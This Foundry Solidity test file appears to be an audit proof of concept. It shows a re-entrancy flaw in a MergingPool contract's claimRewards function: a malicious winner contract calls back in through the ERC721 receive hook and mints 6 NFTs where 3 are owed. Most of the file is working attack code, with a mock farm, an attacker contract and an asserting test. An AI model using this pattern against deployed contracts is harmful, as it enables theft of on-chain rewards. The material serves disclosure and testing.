// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "forge-std/Test.sol";
import "../../src/MergingPool.sol";

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);
}

/**************************************************
 *                 MOCK CONTRACTS
 **************************************************/

/// @dev Minimal mock of FighterFarm allowing re-entrancy.
contract FighterFarmMock {
    // tokenId => owner
    mapping(uint256 => address) public ownerOfMapping;
    // owner => balance
    mapping(address => uint256) public balance;
    uint256 public tokenIdCounter;

    function setOwner(uint256 tokenId, address owner) external {
        ownerOfMapping[tokenId] = owner;
    }

    function ownerOf(uint256 tokenId) external view returns (address) {
        return ownerOfMapping[tokenId];
    }

    function balanceOf(address owner) external view returns (uint256) {
        return balance[owner];
    }

    /// @notice Mimics the real minting logic and invokes the ERC721 receiver hook
    ///         so the recipient contract can reenter MergingPool.claimRewards.
    function mintFromMergingPool(
        address to,
        string calldata,
        string calldata,
        uint256[2] calldata
    ) external {
        tokenIdCounter += 1;
        ownerOfMapping[tokenIdCounter] = to;
        balance[to] += 1;

        // If the recipient is a contract, invoke the hook enabling re-entrancy.
        if (to.code.length > 0) {
            try IERC721Receiver(to).onERC721Received(msg.sender, address(0), tokenIdCounter, "") returns (bytes4) {
            } catch {
                // swallow failures – not important for the PoC
            }
        }
    }
}

/**************************************************
 *            MALICIOUS WINNER CONTRACT
 **************************************************/

/// @dev Acts as the winner address. Reenters claimRewards inside onERC721Received.
contract MaliciousWinner is IERC721Receiver {
    MergingPool public pool;

    // Stored claim parameters
    string[] private _uris;
    string[] private _types;
    uint256[2][] private _attrs;

    constructor(
        address poolAddress,
        string[] memory uris,
        string[] memory types_,
        uint256[2][] memory attrs_
    ) {
        pool = MergingPool(poolAddress);

        // Persist the calldata into storage for later reuse during re-entrancy.
        for (uint256 i = 0; i < uris.length; i++) {
            _uris.push(uris[i]);
            _types.push(types_[i]);
            _attrs.push(attrs_[i]);
        }
    }

    // Kick-off function called by the test – performs the first claim.
    function attack() external {
        pool.claimRewards(_copyUris(), _copyTypes(), _copyAttrs());
    }

    // ERC721 hook – gets executed on every mint and reenters claimRewards.
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        // Reenter with the exact same calldata.
        pool.claimRewards(_copyUris(), _copyTypes(), _copyAttrs());
        return this.onERC721Received.selector;
    }

    /*//////////////////////////////////////////////////////////////
                               HELPERS
    //////////////////////////////////////////////////////////////*/

    function _copyUris() internal view returns (string[] memory arr) {
        arr = new string[](_uris.length);
        for (uint256 i = 0; i < _uris.length; i++) arr[i] = _uris[i];
    }

    function _copyTypes() internal view returns (string[] memory arr) {
        arr = new string[](_types.length);
        for (uint256 i = 0; i < _types.length; i++) arr[i] = _types[i];
    }

    function _copyAttrs() internal view returns (uint256[2][] memory arr) {
        arr = new uint256[2][](_attrs.length);
        for (uint256 i = 0; i < _attrs.length; i++) arr[i] = _attrs[i];
    }
}

/**************************************************
 *                EXPLOIT TEST
 **************************************************/

contract ExploitTest is Test {
    MergingPool         private pool;
    FighterFarmMock     private farm;
    MaliciousWinner     private attacker;

    // Helpers
    address private constant RANKED_BATTLE = address(999);

    function setUp() public {
        /* Deploy gadgets */
        farm = new FighterFarmMock();
        pool = new MergingPool(address(this), RANKED_BATTLE, address(farm));

        // Reduce winners per period to simplify the scenario (1 winner / round).
        pool.updateWinnersPerPeriod(1);

        /* Prepare three rounds – tokenIds 1, 2, 3 are all owned by the attacker */
        // Build attacker first so we can assign ownership of the fighter tokens.
        (
            string[] memory uris,
            string[] memory types_,
            uint256[2][] memory attrs
        ) = _buildClaimCalldata();

        attacker = new MaliciousWinner(address(pool), uris, types_, attrs);

        // Give ownership of fighter tokens to the malicious contract.
        farm.setOwner(1, address(attacker));
        farm.setOwner(2, address(attacker));
        farm.setOwner(3, address(attacker));

        // Admin (address(this)) picks winners for 3 consecutive rounds.
        uint256[] memory arr = new uint256[](1);

        arr[0] = 1;
        pool.pickWinner(arr); // round 0

        arr[0] = 2;
        pool.pickWinner(arr); // round 1

        arr[0] = 3;
        pool.pickWinner(arr); // round 2
    }

    /// @notice Demonstrates the re-entrancy allowing the attacker to double-claim.
    function test_ReentrancyExploit() public {
        // Expected legitimate payout: one NFT per round => 3 NFTs.
        uint256 expectedLegit = 3;
        assertEq(farm.balanceOf(address(attacker)), 0, "attacker starts with 0 NFTs");

        // Execute exploit – note we do not need to prank; attacker is a contract.
        attacker.attack();

        uint256 finalBalance = farm.balanceOf(address(attacker));

        // The exploit should yield 6 NFTs instead of the intended 3.
        assertEq(finalBalance, 6, "attacker abused reentrancy to mint extra NFTs");
        assertGt(finalBalance, expectedLegit, "payout larger than intended");
    }

    /*//////////////////////////////////////////////////////////////
                               HELPERS
    //////////////////////////////////////////////////////////////*/

    function _buildClaimCalldata()
        internal
        pure
        returns (
            string[] memory uris,
            string[] memory types_,
            uint256[2][] memory attrs
        )
    {
        // We need arrays long enough for the duplicated mints (3 rounds => 3 items).
        uris  = new string[](3);
        types_ = new string[](3);
        attrs = new uint256[2][](3);

        for (uint256 i = 0; i < 3; i++) {
            uris[i]  = "exampleURI";
            types_[i] = "type";
            attrs[i]  = [uint256(0), uint256(0)];
        }
    }
}